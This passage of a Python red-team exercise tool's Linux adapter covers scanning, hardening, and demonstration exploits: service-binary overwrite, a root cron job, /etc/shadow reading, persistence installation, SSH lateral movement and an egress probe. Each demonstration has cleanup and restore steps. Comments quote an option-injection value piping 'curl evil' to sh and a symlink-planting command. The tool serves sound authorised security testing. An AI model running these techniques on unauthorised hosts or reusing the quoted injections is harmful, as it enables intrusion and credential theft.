        # Apply the same time window the journald path applies. Tallying the whole
        # file instead answered "has this log ever held a line", not "was an auth
        # event logged in the window", so a host with months of old records read
        # as logged=True regardless of its current telemetry.
        windowed, parsed = filter_auth_window(auth, since)
        if not parsed:
            # No parseable timestamps means the window could not be applied. Report
            # "cannot tell" (logged=None → the kernel's honest observation path)
            # rather than counting the whole file and calling that an in-window
            # result — a wrong "the control fired" hides a real detection gap.
            return {"logged": None, "source": "auth.log", "window_seconds": since,
                    "reason": ("auth.log timestamps could not be parsed, so the "
                               "window could not be applied; refusing to tally the "
                               "whole file and call that an in-window result")}
        counts = parse_auth_events(windowed)
        return {"logged": counts["total"] > 0, "counts": counts,
                "source": "auth.log", "window_seconds": since}
    res = run(["journalctl", "--since", f"{since} seconds ago", "--no-pager",
               "-o", "short", "SYSLOG_FACILITY=10"])
    counts = parse_auth_events(res.stdout)
    return {"logged": counts["total"] > 0, "counts": counts,
            "source": "journald", "window_seconds": since,
            "records_failures": counts["failed"] > 0 or counts["total"] > 0}


@LinuxAdapter.implements("detect.rule")
def _detect_rule(self: LinuxAdapter, verb: Verb, action: Action) -> dict[str, Any]:
    rule = action.params["rule"]
    since = int(action.params.get("since_seconds", 300))
    # We do not embed a Sigma engine. What we honestly support is auditd rule
    # *keys* ("auditd:exec") and a keyword search of the journal; anything else
    # is reported as unsupported-rule rather than silently "did not fire".
    if rule.startswith("auditd:"):
        key = rule.split(":", 1)[1]
        available, result = _ausearch_window(since, key=key)
        result["rule"] = rule
        if not available:
            result["gap"] = "auditd not queryable; rule cannot be evaluated"
        return result
    if which("journalctl"):
        res = run(["journalctl", "--since", f"{since} seconds ago",
                   "--no-pager", "-g", re.escape(rule)])
        hits = len([ln for ln in res.stdout.splitlines() if ln.strip()])
        return {"rule": rule, "logged": hits > 0, "count": hits,
                "source": "journald-grep", "window_seconds": since,
                "_note": "matched by keyword search, not a real detection engine"}
    return {"rule": rule, "logged": False, "source": "none",
            "reason": "no auditd rule key and no journalctl; cannot evaluate rule"}


# ===========================================================================
# vuln.*  — turn observations into findings (priority 3)
# ===========================================================================


@LinuxAdapter.implements("vuln.weak_permissions")
def _vuln_weak_permissions(self: LinuxAdapter, verb: Verb, action: Action) -> dict[str, Any]:
    current_uid = os.getuid() if hasattr(os, "getuid") else 0
    findings: list[dict[str, Any]] = []
    writable_service_bins: list[str] = []

    # Writable service binaries — the direct service_permissions primitive.
    for unit, binpath in self._service_exec_paths().items():
        if not binpath or not os.path.isabs(binpath):
            continue
        try:
            st = os.stat(binpath)
        except OSError:
            continue
        issue = classify_perm_issue(binpath, st.st_mode, st.st_uid,
                                    current_uid=current_uid)
        if issue:
            issue["unit"] = unit
            findings.append(issue)
            if os.access(binpath, os.W_OK):
                writable_service_bins.append(binpath)

    # World-writable / setuid files in privileged directories.
    watch_dirs = ("/etc", "/usr/local/bin", "/usr/local/sbin", "/opt")
    scanned = 0
    for d in watch_dirs:
        for root, _dirs, files in os.walk(d):
            for fn in files:
                if scanned >= 4000:  # bound the walk
                    break
                scanned += 1
                p = os.path.join(root, fn)
                try:
                    st = os.lstat(p)
                except OSError:
                    continue
                if not statmod.S_ISREG(st.st_mode):
                    continue
                issue = classify_perm_issue(p, st.st_mode, st.st_uid,
                                            current_uid=current_uid)
                if issue:
                    findings.append(issue)
    return {"findings": findings, "count": len(findings),
            "writable_service_binaries": writable_service_bins,
            "scanned_files": scanned}


@LinuxAdapter.implements("vuln.credential_exposure")
def _vuln_credential_exposure(self: LinuxAdapter, verb: Verb, action: Action) -> dict[str, Any]:
    findings: list[dict[str, Any]] = []
    home = os.path.expanduser("~")
    # Shell history is the classic place credentials leak (a typed password, a
    # curl with a token). Config files and env come next.
    targets = [
        os.path.join(home, ".bash_history"),
        os.path.join(home, ".zsh_history"),
        os.path.join(home, ".python_history"),
        os.path.join(home, ".mysql_history"),
        os.path.join(home, ".netrc"),
        os.path.join(home, ".pgpass"),
        os.path.join(home, ".aws/credentials"),
        os.path.join(home, ".config/gcloud/credentials.db"),
        "/etc/environment",
    ]
    for path in targets:
        body = self._read_text(path)
        if body:
            findings.extend(find_secrets(body, source=path))
    # Environment of the current process (never dumps other users' /proc/*/environ
    # unless privileged; that would be its own decision).
    env_blob = "\n".join(f"{k}={v}" for k, v in os.environ.items())
    findings.extend(find_secrets(env_blob, source="process environment"))
    # Deduplicate by (source, kind, line).
    seen = set()
    unique = []
    for f in findings:
        sig = (f["source"], f["kind"], f["line"])
        if sig not in seen:
            seen.add(sig)
            unique.append(f)
    return {"findings": unique, "count": len(unique),
            "note": "values are redacted; only location and kind are reported"}


@LinuxAdapter.implements("vuln.privilege_path")
def _vuln_privilege_path(self: LinuxAdapter, verb: Verb, action: Action) -> dict[str, Any]:
    # Compose the other enum/vuln facts into concrete chains.
    priv = _enum_privileges(self, verb, action)
    is_root = bool(priv.get("is_root"))
    sudo = priv.get("sudo", {}) if isinstance(priv.get("sudo"), dict) else {}
    caps = priv.get("capabilities_effective", [])
    groups = [g["name"] for g in priv.get("identity", {}).get("groups", [])]
    weak = _vuln_weak_permissions(self, verb, action)
    chains = derive_privilege_paths(
        is_root=is_root, sudo=sudo, caps=caps, groups=groups,
        writable_service_bins=weak.get("writable_service_binaries", []),
    )
    return {"chains": chains, "count": len(chains), "already_root": is_root}


@LinuxAdapter.implements("vuln.patch_gap")
def _vuln_patch_gap(self: LinuxAdapter, verb: Verb, action: Action) -> dict[str, Any]:
    min_sev = action.params.get("min_severity", "medium")
    sw = _enum_software(self, verb, action)
    if isinstance(sw, Observation):
        packages: list[dict[str, str]] = []
    else:
        packages = sw.get("packages", [])
    findings = assess_patch_gap(packages, min_severity=min_sev)
    return {
        "findings": findings,
        "count": len(findings),
        "min_severity": min_sev,
        "_note": ("matched against a small built-in known-vulnerable table, not a "
                  "live CVE feed; a real deployment must supply a vulnerability "
                  "database. Absence of findings here is not proof of patching."),
    }


# ===========================================================================
# harden.*  — fix what the exercise proved (priority 4)
# ===========================================================================


def _audit_rule_for(source: str) -> str | None:
    """Map a telemetry-source name to the audit rule that enables it.

    Pure so the mapping is testable without touching auditctl. Returns ``None``
    for an unknown source rather than inventing a rule.
    """
    rules = {
        "execve": "-a always,exit -F arch=b64 -S execve -k exec",
        "process_creation": "-a always,exit -F arch=b64 -S execve -k exec",
        "shadow": "-w /etc/shadow -p wa -k identity",
        "credential_access": "-w /etc/shadow -p r -k cred",
        "passwd": "-w /etc/passwd -p wa -k identity",
        "sudoers": "-w /etc/sudoers -p wa -k priv",
        "cron": "-w /etc/crontab -p wa -k persistence",
    }
    return rules.get(source)


@LinuxAdapter.implements("harden.enable_telemetry")
def _harden_enable_telemetry(self: LinuxAdapter, verb: Verb, action: Action) -> Observation | dict[str, Any]:
    source = action.params["source"]
    rule = _audit_rule_for(source)
    if rule is None:
        return self._unsupported(
            action, f"no known audit rule maps to telemetry source {source!r}; "
            f"known: execve, shadow, passwd, sudoers, cron")
    if not which("auditctl"):
        return Observation(action=action, ok=False, platform=self.platform,
                           error="auditctl not installed; cannot enable auditd rules")
    # Load live and persist to rules.d so it survives a reboot. Record both.
    live = run(["auditctl"] + shlex.split(rule))
    persisted = False
    rules_file = f"/etc/audit/rules.d/whetstone-{source}.rules"
    try:
        with open(rules_file, "a") as fh:
            fh.write(rule + "\n")
        persisted = True
    except OSError as exc:
        persist_err = str(exc)
    else:
        persist_err = ""
    return {
        "source": source,
        "rule": rule,
        "loaded_live": live.ok,
        "persisted": persisted,
        "rules_file": rules_file if persisted else "",
        "error": (live.stderr.strip() or persist_err) or "",
        "changed": {"appended_to": rules_file if persisted else None,
                    "auditctl_argv": live.argv},
    }


@LinuxAdapter.implements("harden.fix_permissions")
def _harden_fix_permissions(self: LinuxAdapter, verb: Verb, action: Action) -> Observation | dict[str, Any]:
    path = action.params["path"]
    try:
        st = os.stat(path)
    except OSError as exc:
        return Observation(action=action, ok=False, platform=self.platform,
                           error=f"cannot stat {path}: {exc}")
    previous = oct(statmod.S_IMODE(st.st_mode))
    # Strip group/other write; leave read/execute alone. Conservative on purpose:
    # loosening is never the fix, and removing o+w/g+w addresses what
    # vuln.weak_permissions flags without guessing intent.
    new_mode = st.st_mode & ~(statmod.S_IWGRP | statmod.S_IWOTH)
    try:
        os.chmod(path, statmod.S_IMODE(new_mode))
    except OSError as exc:
        return Observation(action=action, ok=False, platform=self.platform,
                           error=f"chmod failed on {path}: {exc}. previous mode "
                                 f"{previous} left unchanged")
    return {
        "path": path,
        "previous_mode": previous,
        "new_mode": oct(statmod.S_IMODE(new_mode)),
        "changed": {"path": path, "from": previous, "to": oct(statmod.S_IMODE(new_mode))},
        "restore_hint": f"chmod {previous.replace('0o', '')} {path}",
    }


@LinuxAdapter.implements("harden.remove_persistence")
def _harden_remove_persistence(self: LinuxAdapter, verb: Verb, action: Action) -> Observation | dict[str, Any]:
    entry = action.params["entry"]
    # 'entry' is an identifier from enum.persistence. We support the two forms it
    # yields that are safe to act on generically: a systemd unit name and an
    # absolute file path (cron drop-in / autostart .desktop). A bare cron *line*
    # is not removed automatically — too easy to delete the wrong one.
    if entry.endswith((".service", ".timer")) and which("systemctl"):
        dis = run(["systemctl", "disable", "--now", entry])
        return {
            "entry": entry, "action": "systemctl disable --now",
            "ok": dis.ok, "error": dis.stderr.strip(),
            "changed": {"disabled_unit": entry},
            "restore_hint": f"systemctl enable --now {entry}",
        }
    if os.path.isabs(entry) and os.path.isfile(entry):
        # Move aside rather than delete, so removal is reversible by hand.
        backup = entry + ".whetstone-disabled"
        try:
            os.rename(entry, backup)
        except OSError as exc:
            return Observation(action=action, ok=False, platform=self.platform,
                               error=f"could not move {entry} aside: {exc}")
        return {
            "entry": entry, "action": "moved aside",
            "moved_to": backup,
            "changed": {"renamed_from": entry, "renamed_to": backup},
            "restore_hint": f"mv {backup} {entry}",
        }
    return self._unsupported(
        action, f"cannot act on persistence entry {entry!r} generically: supply a "
        "systemd unit name or an absolute file path (cron drop-in / autostart "
        "file). A raw cron line must be removed by hand to avoid deleting the "
        "wrong entry.")


# ===========================================================================
# exploit.*  / postex.*  — red team (priority 5)
#
# Each records EXACTLY what it changed so a human can undo it, honours its
# cleanup/restore flag and reports truthfully whether cleanup ran, and is
# self-tested only against a temporary sandbox directory (see _run_self_tests).
# ===========================================================================


def _overwrite_binary(target: str, payload: bytes, *, restore: bool) -> dict[str, Any]:
    """The service_permissions mechanism, isolated from service resolution.

    Backs up the original bytes, writes the payload, and — if ``restore`` — puts
    the original back, reporting whether that succeeded. Taking explicit paths
    (not a service name) is what lets the self-test drive it against a sandbox
    file instead of a live service binary.
    """
    record: dict[str, Any] = {"target": target, "restore_requested": restore}
    try:
        with open(target, "rb") as fh:
            original = fh.read()
    except OSError as exc:
        record["ok"] = False
        record["error"] = f"cannot read target: {exc}"
        return record
    record["original_bytes"] = len(original)
    try:
        with open(target, "wb") as fh:
            fh.write(payload)
    except OSError as exc:
        record["ok"] = False
        record["error"] = f"cannot write payload (need write permission): {exc}"
        return record
    record["ok"] = True
    record["payload_bytes"] = len(payload)
    record["changed"] = {"overwrote": target, "with_bytes": len(payload)}
    if restore:
        try:
            with open(target, "wb") as fh:
                fh.write(original)
            record["restored"] = True
        except OSError as exc:
            record["restored"] = False
            record["restore_error"] = (
                f"RESTORE FAILED: {exc}. Original ({len(original)} bytes) must be "
                "put back by hand.")
    return record


@LinuxAdapter.implements("exploit.service_permissions")
def _exploit_service_permissions(self: LinuxAdapter, verb: Verb, action: Action) -> Observation | dict[str, Any]:
    service = action.params["service"]
    restore = bool(action.params.get("restore", True))
    unit = service if service.endswith(".service") else service + ".service"
    binpath = self._service_exec_paths().get(unit)
    if not binpath:
        return Observation(action=action, ok=False, platform=self.platform,
                           error=f"could not resolve ExecStart binary for {unit}")
    if not os.access(binpath, os.W_OK):
        return Observation(
            action=action, ok=False, platform=self.platform,
            error=f"{binpath} is not writable by the current user; the "
                  "service_permissions technique does not apply here")
    # A harmless marker payload — this is a demonstration, not a real implant.
    payload = b"#!/bin/sh\n# whetstone service_permissions demonstration marker\n"
    rec = _overwrite_binary(binpath, payload, restore=restore)
    rec["service"] = unit
    rec["exec_binary"] = binpath
    if which("systemctl") and rec.get("ok"):
        run(["systemctl", "restart", unit])
        rec["service_restarted"] = True
    return rec


@LinuxAdapter.implements("exploit.unquoted_path")
def _exploit_unquoted_path(self: LinuxAdapter, verb: Verb, action: Action) -> Observation:
    """Windows service-path parsing bug; the Linux analogue is different.

    The "unquoted service path" hijack is specific to how the Windows Service
    Control Manager tokenises a ``C:\\Program Files\\...`` ExecStart. systemd does
    not parse ExecStart that way — a path with spaces is quoted in the unit file
    and resolved as one token — so this exact technique has no Linux counterpart.
    The nearest Linux relatives are a *relative* ExecStart resolved via a
    writable ``PATH`` entry, or a writable directory earlier in a service's
    binary path; both are covered by ``exploit.service_permissions`` /
    ``vuln.weak_permissions``. Rather than fake a Windows bug on Linux, this is
    reported unsupported with that pointer.
    """
    return self._unsupported(
        action,
        "unquoted-service-path hijack is a Windows Service Control Manager "
        "parsing bug and has no direct Linux equivalent; systemd resolves a "
        "quoted ExecStart as a single token. The analogous Linux weaknesses "
        "(writable PATH entry / relative ExecStart) are handled by "
        "exploit.service_permissions and vuln.weak_permissions.")


def _write_cron_job(cron_dir: str, name: str, schedule: str, command: str,
                    *, as_user: str = "root") -> dict[str, Any]:
    """The scheduled_task mechanism as a pure(ish) file write against a dir.

    Writes a ``/etc/cron.d``-style drop-in. Isolated from ``/etc/cron.d`` so the
    self-test can point ``cron_dir`` at a sandbox. Returns the exact path and
    line written, which is what the audit log quotes and what a human deletes if
    cleanup fails.
    """
    path = os.path.join(cron_dir, name)
    line = f"{schedule} {as_user} {command}\n"
    with open(path, "w") as fh:
        fh.write("# whetstone scheduled_task demonstration\n")
        fh.write(line)
    return {"path": path, "line": line.strip(), "as_user": as_user}


def _create_proof_marker(*, dir: str = "/tmp") -> str:
    """Mint an unpredictable, freshly-owned proof file and return its path.

    scheduled_task drops a cron line that runs ``id > <marker>`` AS ROOT every
    minute. The old code hard-coded ``/tmp/whetstone-scheduled-task.proof`` — a
    constant name in a world-writable directory — and root's shell redirect
    follows symlinks and truncates. Any local user could pre-plant
    ``ln -s /etc/nologin /tmp/whetstone-scheduled-task.proof`` and turn a "prove a
    cron job can be created" demo into an arbitrary root-owned-file overwrite.

    ``mkstemp`` closes that hole: it opens with ``O_CREAT | O_EXCL | O_NOFOLLOW``
    semantics, so it refuses to reuse an existing path or follow a symlink, and it
    picks a random name so there is nothing predictable to squat. The file exists,
    is 0600, and is owned by us before the cron line ever fires, so the redirect
    only ever truncates this fresh file — never a pre-existing target. Returning
    the concrete path lets the caller clean it up and lets the audit log name it.
    """
    fd, path = tempfile.mkstemp(prefix="whetstone-schedtask-", suffix=".proof",
                                dir=dir)
    os.close(fd)
    return path


@LinuxAdapter.implements("exploit.scheduled_task")
def _exploit_scheduled_task(self: LinuxAdapter, verb: Verb, action: Action) -> Observation | dict[str, Any]:
    as_user = action.params.get("as_user", "SYSTEM")
    # SYSTEM is the Windows name; the Linux equivalent is root.
    if as_user == "SYSTEM":
        as_user = "root"
    cleanup = bool(action.params.get("cleanup", True))
    if not os.path.isdir("/etc/cron.d"):
        return self._unsupported(
            action, "/etc/cron.d not present; cron drop-in scheduled tasks are not "
            "available on this host")
    if not os.access("/etc/cron.d", os.W_OK):
        return Observation(action=action, ok=False, platform=self.platform,
                           error="/etc/cron.d is not writable by the current user; "
                                 "creating a scheduled task requires root here")
    name = "whetstone-demo"
    # Mint the proof file up front so root's cron redirect only ever truncates a
    # fresh, unpredictable, already-owned path — see _create_proof_marker for why
    # a fixed /tmp name was a root-file-overwrite primitive.
    marker = _create_proof_marker()
    command = f"/bin/sh -c 'id > {marker}'"
    try:
        rec = _write_cron_job("/etc/cron.d", name, "* * * * *", command, as_user=as_user)
    except OSError as exc:
        # The cron drop-in failed, so roll back the marker we already created
        # rather than leaving an orphaned file behind for a run that never armed.
        try:
            os.unlink(marker)
        except OSError:
            pass
        return Observation(action=action, ok=False, platform=self.platform,
                           error=f"could not write cron drop-in: {exc}")
    rec["marker"] = marker
    rec["changed"] = {"created_file": rec["path"], "created_marker": marker}
    rec["cleanup_requested"] = cleanup
    if cleanup:
        # Remove both artefacts. The marker is not optional cleanup: mkstemp
        # created it immediately, so skipping it would leave an empty file in
        # /tmp on every run even when the cron line never fired.
        failures = []
        for target in (rec["path"], marker):
            try:
                os.remove(target)
            except OSError as exc:
                failures.append(f"{target} ({exc})")
        if failures:
            rec["cleaned_up"] = False
            rec["cleanup_error"] = ("CLEANUP FAILED for " + ", ".join(failures)
                                    + f". Remove {rec['path']} by hand or it runs "
                                    "every minute as root.")
        else:
            rec["cleaned_up"] = True
    return rec


def _summarize_credential_store(shadow_text: str | None, *, redact: bool) -> dict[str, Any]:
    """Shape the credential_dump result from whatever /etc/shadow we could read."""
    if shadow_text is None:
        return {"readable": False,
                "reason": "/etc/shadow is not readable by the current user; the "
                          "credential store requires root. This is itself the "
                          "finding: without root, this dump is not possible."}
    summary = summarize_shadow(shadow_text, redact=redact)
    exposed = [a["user"] for a in summary["accounts"]
               if a["state"] in {"hashed", "empty_password"}]
    return {
        "readable": True,
        "exposed_accounts": exposed,
        "exposed_count": len(exposed),
        "hashed_count": summary["hashed_count"],
        "empty_password_count": summary["empty_password_count"],
        "redacted": redact,
        "accounts": summary["accounts"],
    }


@LinuxAdapter.implements("postex.credential_dump")
def _postex_credential_dump(self: LinuxAdapter, verb: Verb, action: Action) -> dict[str, Any]:
    redact = bool(action.params.get("redact", True))
    shadow = self._read_text("/etc/shadow")
    result = _summarize_credential_store(shadow, redact=redact)
    if not redact:
        result["_warning"] = ("redact=false: password hashes are in this "
                              "observation and the audit log must now be handled "
                              "as a credential store in its own right")
    return result


def _install_persistence(mechanism: str, sandbox: str, *, cleanup: bool) -> dict[str, Any]:
    """The persistence_install mechanism, parameterised by a base directory.

    ``sandbox`` is the directory the entry is written under; in production the
    handler passes the real location for the chosen mechanism, and the self-test
    passes a temp dir. Records the exact artefact created and cleans it up when
    asked, reporting whether cleanup succeeded.
    """
    os.makedirs(sandbox, exist_ok=True)
    if mechanism in {"autorun", "profile"}:
        # freedesktop autostart .desktop entry (autorun) or a profile snippet.
        if mechanism == "autorun":
            path = os.path.join(sandbox, "whetstone-demo.desktop")
            body = ("[Desktop Entry]\nType=Application\nName=whetstone-demo\n"
                    "Exec=/bin/true\nX-GNOME-Autostart-enabled=true\n")
        else:
            path = os.path.join(sandbox, ".whetstone-profile.sh")
            body = "# whetstone persistence demonstration\n/bin/true\n"
        with open(path, "w") as fh:
            fh.write(body)
    elif mechanism == "cron":
        path = os.path.join(sandbox, "whetstone-demo")
        with open(path, "w") as fh:
            fh.write("* * * * * root /bin/true\n")
    elif mechanism == "service":
        path = os.path.join(sandbox, "whetstone-demo.service")
        with open(path, "w") as fh:
            fh.write("[Unit]\nDescription=whetstone demo\n[Service]\n"
                     "ExecStart=/bin/true\n[Install]\nWantedBy=multi-user.target\n")
    else:
        raise AdapterError(f"unhandled mechanism {mechanism!r}")

    rec: dict[str, Any] = {
        "mechanism": mechanism,
        "installed_path": path,
        "changed": {"created_file": path},
        "cleanup_requested": cleanup,
    }
    if cleanup:
        try:
            os.remove(path)
            rec["cleaned_up"] = True
        except OSError as exc:
            rec["cleaned_up"] = False
            rec["cleanup_error"] = f"CLEANUP FAILED: {exc}. Remove {path} by hand."
    return rec


@LinuxAdapter.implements("postex.persistence_install")
def _postex_persistence_install(self: LinuxAdapter, verb: Verb, action: Action) -> Observation | dict[str, Any]:
    mechanism = action.params["mechanism"]
    cleanup = bool(action.params.get("cleanup", True))
    # launch_agent is a macOS concept — honest refusal rather than a fake.
    if mechanism == "launch_agent":
        return self._unsupported(
            action, "launch_agent is a macOS launchd mechanism; on Linux use "
            "'service' (systemd), 'cron', 'autorun' (~/.config/autostart) or "
            "'profile' (shell rc).")
    home = os.path.expanduser("~")
    locations = {
        "autorun": os.path.join(home, ".config/autostart"),
        "profile": home,
        "cron": "/etc/cron.d",
        "service": os.path.join(home, ".config/systemd/user"),
    }
    base = locations.get(mechanism)
    if base is None:
        return self._unsupported(action, f"unknown persistence mechanism {mechanism!r}")
    try:
        rec = _install_persistence(mechanism, base, cleanup=cleanup)
    except OSError as exc:
        return Observation(action=action, ok=False, platform=self.platform,
                           error=f"persistence install failed ({mechanism}): {exc}")
    return rec


def _reject_option_injection(*values: str) -> None:
    """Refuse argv values that a downstream tool would read as an *option*.

    The no-shell design (argv lists, never a command string) removes command
    injection outright, but it does not stop *option* injection: a model-supplied
    positional like ``as_user='-oProxyCommand=curl evil|sh'`` is a single argv
    entry, yet ``ssh`` (and ``smbclient``) parse any argv element beginning with
    ``-`` as an option rather than a destination. These values are destinations
    and usernames, for which a leading dash is never legitimate, so we refuse
    rather than pass it through. This is the one residual injection class the
    argv-list rule does not close by itself, so it is closed here explicitly.
    """
    for v in values:
        if v.startswith("-"):
            raise AdapterError(
                f"refusing argument {v!r}: a value beginning with '-' would be "
                "interpreted as a command-line option by the remote-access tool "
                "(option injection). Destinations and usernames must not start "
                "with a dash.")


def interpret_ssh_result(returncode: int, stderr: str) -> dict[str, Any]:
    """Classify a non-interactive ``ssh -o BatchMode=yes`` attempt.

    Pure so lateral-move outcome classification is testable without a network.
    BatchMode means ssh never prompts, so ``Permission denied`` is an honest
    "auth would be needed" rather than a hang, and connection-refused is a
    reachability fact distinct from an auth fact.
    """
    low = stderr.lower()
    if returncode == 0:
        return {"reached": True, "authenticated": True, "detail": "command ran on remote"}
    if "permission denied" in low:
        return {"reached": True, "authenticated": False,
                "detail": "host reachable, key/credential rejected (no password sent)"}
    if "connection refused" in low or "no route to host" in low or "timed out" in low:
        return {"reached": False, "authenticated": False,
                "detail": "host not reachable on ssh"}
    return {"reached": None, "authenticated": False, "detail": stderr.strip()[:200]}


@LinuxAdapter.implements("postex.lateral_move")
def _postex_lateral_move(self: LinuxAdapter, verb: Verb, action: Action) -> Observation | dict[str, Any]:
    method = action.params["method"]
    as_user = action.params["as_user"]
    target = action.target or ""
    # Close option-injection before any of these values reaches ssh/smbclient argv.
    _reject_option_injection(target, as_user)
    if method in {"winrm", "rdp"}:
        return self._unsupported(
            action, f"{method} is not a native Linux client capability; lateral "
            "movement from a Linux host is implemented for ssh (and smb via "
            "smbclient). Use method=ssh.")
    if method == "smb":
        if not which("smbclient"):
            return Observation(action=action, ok=False, platform=self.platform,
                               error="smbclient not installed; cannot test SMB access")
        res = run(["smbclient", "-L", target, "-U", as_user, "-N"], timeout=20)
        return {"method": "smb", "target": target, "as_user": as_user,
                "reached": res.ok, "detail": res.stderr.strip()[:200] or "listed shares"}
    # ssh — BatchMode prevents any password prompt, so this never hangs and never
    # sends a password. It proves key-based reachability only.
    if not which("ssh"):
        return Observation(action=action, ok=False, platform=self.platform,
                           error="ssh client not installed")
    res = run(["ssh", "-o", "BatchMode=yes", "-o", "ConnectTimeout=10",
               "-o", "StrictHostKeyChecking=accept-new",
               f"{as_user}@{target}", "id"], timeout=20)
    outcome = interpret_ssh_result(res.returncode, res.stderr)
    outcome.update({"method": "ssh", "target": target, "as_user": as_user})
    return outcome


@LinuxAdapter.implements("postex.privilege_escalate")
def _postex_privilege_escalate(self: LinuxAdapter, verb: Verb, action: Action) -> Observation | dict[str, Any]:
    chain = action.params["chain"]
    # Only execute a chain vuln.privilege_path actually found, and only the ones
    # that are safe to *demonstrate* non-destructively (prove we could, don't
    # actually take over). Re-derive the chains so we never act on an id the
    # current host does not support.
    available = {c["id"]: c for c in _vuln_privilege_path(self, verb, action)["chains"]}
    if chain not in available:
        return Observation(
            action=action, ok=False, platform=self.platform,
            error=f"chain {chain!r} was not found by vuln.privilege_path on this "
                  f"host; available: {sorted(available) or 'none'}. This verb will "
                  "not attempt a chain that was not identified.")
    picked = available[chain]
    if chain in {"sudo-all", "sudo-nopasswd"} and which("sudo"):
        # Non-destructive proof: run `sudo -n id`, which shows the root uid we
        # would get without changing anything.
        res = run(["sudo", "-n", "id"])
        proved = res.ok and "uid=0" in res.stdout
        return {"chain": chain, "technique": picked["technique"],
                "proved": proved, "method": "sudo -n id",
                "detail": res.stdout.strip()[:200] if proved else res.stderr.strip()[:200],
                "changed": {}, "note": "non-destructive proof only; no state changed"}
    return {"chain": chain, "technique": picked["technique"], "proved": False,
            "method": "not auto-demonstrated",
            "note": f"chain identified ({picked['evidence']}) but is only "
                    "demonstrated manually to avoid destructive action",
            "changed": {}}


def _send_synthetic(host: str, port: int, nbytes: int, *, timeout: float = 5.0) -> dict[str, Any]:
    """Send generated bytes to a sink and report how many left.

    Never reads a file — the bytes are synthetic (a repeated pattern), so this
    measures egress *volume* control, not data. Returns the count actually sent,
    which is what an egress-detection exercise checks. Loopback-testable: the
    self-test points it at a throwaway localhost server.
    """
    chunk = b"\x00\xff" * 512
    sent = 0
    try:
        with socket.create_connection((host, port), timeout=timeout) as sock:
            sock.settimeout(timeout)
            while sent < nbytes:
                take = min(len(chunk), nbytes - sent)
                sock.sendall(chunk[:take])
                sent += take
    except OSError as exc:
        return {"ok": False, "bytes_sent": sent, "error": str(exc)}
    return {"ok": True, "bytes_sent": sent}


@LinuxAdapter.implements("postex.exfil_probe")
def _postex_exfil_probe(self: LinuxAdapter, verb: Verb, action: Action) -> dict[str, Any]:
    nbytes = int(action.params.get("bytes", 1048576))
    sink = action.params["sink"]
    # The gate scope-checked `sink` before this ran. sink may be host or host:port.
    if ":" in sink:
        host, _, port_s = sink.rpartition(":")
        port = int(port_s)
    else:
        host, port = sink, 4444
    result = _send_synthetic(host, port, nbytes)
    result.update({"sink": sink, "requested_bytes": nbytes,
                   "note": "synthetic bytes only; no file contents were sent"})
    return result


# ===========================================================================
# Self-tests: exercise every pure parser against captured fixture output, and
# the red-verb mechanisms against a throwaway sandbox. Runnable off-Linux.
# ===========================================================================


def _run_self_tests() -> int:  # noqa: C901 — a test runner is allowed to be long
    import json
    import threading

    passed = 0
    failed = 0

    def check(name: str, cond: bool, detail: str = "") -> None:
        nonlocal passed, failed
        if cond:
            passed += 1
        else:
            failed += 1
            print(f"  FAIL {name}: {detail}")

    # ---- enum.host parsers ----
    OS_RELEASE = (
        'NAME="Debian GNU/Linux"\n'
        'VERSION_ID="12"\n'
        'VERSION="12 (bookworm)"\n'
        'ID=debian\n'
        'PRETTY_NAME="Debian GNU/Linux 12 (bookworm)"\n'
        '# a comment\n'
        'HOME_URL="https://www.debian.org/"\n'
    )
    osr = parse_os_release(OS_RELEASE)
    check("os_release.name", osr["NAME"] == "Debian GNU/Linux", osr.get("NAME"))
    check("os_release.id", osr["ID"] == "debian", osr.get("ID"))
    check("os_release.no_comment", "# a comment" not in osr)

    PROC_VERSION = ("Linux version 6.1.0-18-amd64 (debian-kernel@lists.debian.org) "
                    "(gcc-12 (Debian 12.2.0-14) 12.2.0, GNU ld (GNU Binutils for "
                    "Debian) 2.40) #1 SMP PREEMPT_DYNAMIC Debian 6.1.76-1")
    check("proc_version.kernel",
          parse_proc_version(PROC_VERSION)["kernel"] == "6.1.0-18-amd64")

    UNAME = "Linux kali 6.1.0-18-amd64 x86_64 GNU/Linux"
    un = parse_uname(UNAME)
    check("uname.node", un["nodename"] == "kali", un.get("nodename"))
    check("uname.machine", un["machine"] == "x86_64", un.get("machine"))
    check("uname.os", un["operating_system"] == "GNU/Linux", un.get("operating_system"))

    HOSTNAMECTL = (
        "   Static hostname: kali\n"
        "         Icon name: computer-vm\n"
        "           Chassis: vm\n"
        "        Machine ID: 0a1b2c3d4e5f6071829304a5b6c7d8e9\n"
        "   Operating System: Kali GNU/Linux Rolling\n"
        "            Kernel: Linux 6.1.0-18-amd64\n"
        "     Virtualization: kvm\n"
    )
    hc = parse_hostnamectl(HOSTNAMECTL)
    check("hostnamectl.hostname", hc["static_hostname"] == "kali", hc.get("static_hostname"))
    check("hostnamectl.virt", hc["virtualization"] == "kvm", hc.get("virtualization"))

    # ---- users ----
    PASSWD = (
        "root:x:0:0:root:/root:/bin/bash\n"
        "daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n"
        "sync:x:4:65534:sync:/bin:/bin/sync\n"
        "kali:x:1000:1000:Kali,,,:/home/kali:/usr/bin/zsh\n"
        "postgres:x:114:120:PostgreSQL admin:/var/lib/postgresql:/bin/bash\n"
        "nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n"
    )
    enabled = parse_passwd(PASSWD, include_disabled=False)
    names = {u["name"] for u in enabled}
    check("passwd.excludes_nologin", "daemon" not in names and "nobody" not in names, names)
    check("passwd.keeps_login", {"root", "kali", "postgres"} <= names, names)
    kali = next(u for u in enabled if u["name"] == "kali")
    check("passwd.uid", kali["uid"] == 1000, kali)
    check("passwd.not_system", kali["system"] is False, kali)
    check("passwd.postgres_system", next(u for u in enabled if u["name"] == "postgres")["system"] is True)
    all_users = parse_passwd(PASSWD, include_disabled=True)
    check("passwd.include_disabled", {"daemon", "nobody"} <= {u["name"] for u in all_users})

    GROUP = (
        "root:x:0:\n"
        "sudo:x:27:kali\n"
        "adm:x:4:syslog,kali\n"
        "docker:x:999:kali\n"
        "kali:x:1000:\n"
    )
    groups, ug = parse_getent_group(GROUP)
    check("group.members", set(ug.get("kali", [])) == {"sudo", "adm", "docker"}, ug.get("kali"))
    check("group.docker_gid", next(g for g in groups if g["name"] == "docker")["gid"] == 999)

    # ---- privileges ----
    ID = "uid=1000(kali) gid=1000(kali) euid=0(root) groups=1000(kali),4(adm),27(sudo),999(docker)"
    idp = parse_id(ID)
    check("id.uid", idp["uid"]["id"] == 1000 and idp["uid"]["name"] == "kali", idp.get("uid"))
